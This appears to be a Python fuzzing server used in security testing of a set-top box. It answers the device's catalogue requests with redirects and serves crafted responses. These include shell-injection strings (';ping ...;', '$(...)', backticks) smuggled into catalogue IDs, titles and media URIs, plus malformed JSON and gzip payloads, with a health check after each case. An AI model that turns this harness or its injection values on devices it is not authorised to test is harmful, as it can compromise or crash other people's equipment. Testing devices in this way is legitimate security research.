#!/usr/bin/env python3
import gzip
import json
import os
import socket
import time
import urllib.request

HOST = "192.168.0.163"
PORT = 6400

CANARY = "ping -c1 192.168.0.163"
GENERIC_CASES = [
    ("raw", f";{CANARY};".encode()),
    ("keyvalue", f"name=test\ncommand=;{CANARY};\n".encode()),
    ("json", ('{"name":"$(%s)","command":"%s"}' % (CANARY, CANARY)).encode()),
    ("xml", ("<catalogue><name>`%s`</name><command>%s</command></catalogue>" % (CANARY, CANARY)).encode()),
    ("nul", b"CATALOGUE\x00name\x00;" + CANARY.encode() + b";\x00"),
    ("shell", ("#!/bin/sh\n%s\n" % CANARY).encode()),
]

catalogue_document = {
    "catalogueId": "25282;ping -c1 192.168.50.1;",
    "revision": 2,
    "contents": [
        {
            "id": "programid://test/$(ping -c1 192.168.50.1)",
            "title": "Test `ping -c1 192.168.50.1`",
            "media": [
                {
                    "classification": "urn:nnds:Metro:metadata:MediaTypeCS:2007:2.1",
                    "uri": "http://192.168.0.163:6400/media/;ping%20-c1%20192.168.0.163;",
                }
            ],
        }
    ],
}
catalogue_json = json.dumps(catalogue_document, separators=(",", ":")).encode()
REALISTIC_CASES = [
    ("cmdc-json", catalogue_json, "application/json", None),
    ("cmdc-json-gzip", gzip.compress(catalogue_json), "application/octet-stream", "gzip"),
]

valid_gzip = gzip.compress(catalogue_json)
bad_crc_gzip = valid_gzip[:-1] + bytes([valid_gzip[-1] ^ 0xFF])
PARSE_CASES = [
    ("empty", b"", "application/octet-stream", None),
    ("one-byte", b"{", "application/json", None),
    ("json-truncated", b'{"catalogueId":"25282","contents":[', "application/json", None),
    ("json-type-confusion", b'{"catalogueId":[],"revision":{},"contents":"not-a-list"}', "application/json", None),
    ("json-duplicate-keys", b'{"catalogueId":"25282","catalogueId":null,"contents":[]}', "application/json", None),
    ("json-deep-64", ("[" * 64 + "0" + "]" * 64).encode(), "application/json", None),
    ("invalid-utf8-nul", b'{"title":"\xff\xfe\x00test","contents":[]}', "application/json", None),
    ("gzip-truncated", valid_gzip[: max(1, len(valid_gzip) // 2)], "application/octet-stream", "gzip"),
    ("gzip-bad-crc", bad_crc_gzip, "application/octet-stream", "gzip"),
    ("binary-extreme-lengths", b"CMDC\x00\x00\x00\x01\xff\xff\xff\xff\x7f\xff\xff\xff" + b"A" * 32, "application/octet-stream", None),
]

if os.environ.get("CATALOGUE_FUZZ_MODE") == "realistic":
    CASES = REALISTIC_CASES
elif os.environ.get("CATALOGUE_FUZZ_MODE") == "parse":
    CASES = PARSE_CASES
else:
    CASES = [(name, body, "application/octet-stream", None) for name, body in GENERIC_CASES]


def receive_request(conn):
    data = b""
    while b"\r\n\r\n" not in data and len(data) < 16384:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def respond(conn, status, headers, body=b""):
    lines = [f"HTTP/1.1 {status}"]
    lines.extend(f"{key}: {value}" for key, value in headers.items())
    conn.sendall(("\r\n".join(lines) + "\r\n\r\n").encode() + body)


case_index = 0
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(4)
    server.settimeout(150)
    print(f"listening on {HOST}:{PORT}", flush=True)
    while case_index < len(CASES):
        conn, peer = server.accept()
        with conn:
            conn.settimeout(5)
            request = receive_request(conn)
            first_line = request.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print(f"peer={peer[0]} case={case_index + 1} request={first_line}", flush=True)
            if b"/cmdc/utility/catalogueId/" in request:
                name = CASES[case_index][0]
                location = f"http://return.skytv.co.nz:6400/cmdc/catalogue/fuzz-{case_index + 1}-{name}.bin"
                respond(conn, "302 Found", {
                    "Location": location,
                    "Content-Length": "0",
                    "Connection": "close",
                })
            elif b"/cmdc/catalogue/fuzz-" in request:
                name, body, content_type, content_encoding = CASES[case_index]
                headers = {
                    "Content-Type": content_type,
                    "Content-Length": str(len(body)),
                    "Connection": "close",
                }
                if content_encoding:
                    headers["Content-Encoding"] = content_encoding
                respond(conn, "200 OK", headers, body)
                print(f"served case={case_index + 1} name={name} bytes={len(body)}", flush=True)
                if os.environ.get("CATALOGUE_FUZZ_MODE") == "parse":
                    time.sleep(0.5)
                    try:
                        with urllib.request.urlopen(
                            "http://192.168.50.131:49153/description0.xml", timeout=3
                        ) as health:
                            print(
                                f"health case={case_index + 1} http={health.status} bytes={len(health.read())}",
                                flush=True,
                            )
                    except Exception as error:
                        print(f"HEALTH_FAILURE case={case_index + 1} error={error}", flush=True)
                        raise SystemExit(2)
                case_index += 1
            else:
                respond(conn, "404 Not Found", {"Content-Length": "0", "Connection": "close"})
    print("all fuzz cases served", flush=True)
